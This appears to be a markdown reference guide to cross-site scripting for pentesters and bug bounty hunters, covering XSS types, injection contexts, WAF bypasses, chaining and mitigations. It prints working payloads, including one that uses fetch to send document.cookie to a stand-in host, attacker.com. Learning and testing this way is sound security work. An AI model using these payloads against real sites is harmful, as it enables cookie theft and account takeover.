# 🔥 Cross-Site Scripting (XSS) – Intermediate to Expert Guide

A practical, real-world **XSS (Cross-Site Scripting)** reference for:
- VAPT professionals
- Bug bounty hunters
- Application security engineers
- Security interview preparation (Intermediate → Expert)

This guide focuses on **contexts, exploitation, WAF bypass, chaining, and impact**, not just basic payloads.

---

## 📌 What is XSS?

Cross-Site Scripting (XSS) is a vulnerability where **untrusted input is executed as JavaScript or HTML in a victim’s browser** due to improper validation or output encoding.

### 🎯 Attacker Goals
- Steal cookies / tokens
- Account takeover (ATO)
- Perform actions as victim
- Privilege escalation
- Data exfiltration

---

## 🧨 Types of XSS

### 1️⃣ Reflected XSS
Payload is reflected immediately in the HTTP response.

```html
<script>alert(1)</script>
```

---

### 2️⃣ Stored XSS (Persistent)
Payload is stored in the database and executed for every user.

```html
<img src=x onerror=alert(document.cookie)>
```

⚠️ **Highest severity XSS**

---

### 3️⃣ DOM-Based XSS
Occurs entirely on the client side via JavaScript sinks.

```js
element.innerHTML = location.hash;
```

---

### 4️⃣ Blind XSS
Triggers later in admin panels, logs, dashboards, or emails.

```html
<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
```

---

## 🧠 XSS Contexts

| Context | Example | Payload |
|------|------|------|
| HTML | `<div>INPUT</div>` | `<script>` |
| Attribute | `value="INPUT"` | `" onfocus=alert(1)` |
| JS | `var a="INPUT"` | `";alert(1)//` |
| URL | `href="INPUT"` | `javascript:` |

---

## 🛡️ WAF Bypass Techniques

```html
<ScRiPt>alert(1)</ScRiPt>
<svg onload=alert(1)>
<script>alert(String.fromCharCode(49))</script>
```

---

## 🔗 XSS Chaining

- XSS → Account Takeover
- XSS → CSRF
- XSS → OAuth Token Theft
- XSS → SSRF

---

## 🔐 Mitigation

- Context-aware output encoding
- Avoid innerHTML
- Use DOMPurify
- Implement CSP

---

## ⚠️ Disclaimer
For educational and authorized security testing only.
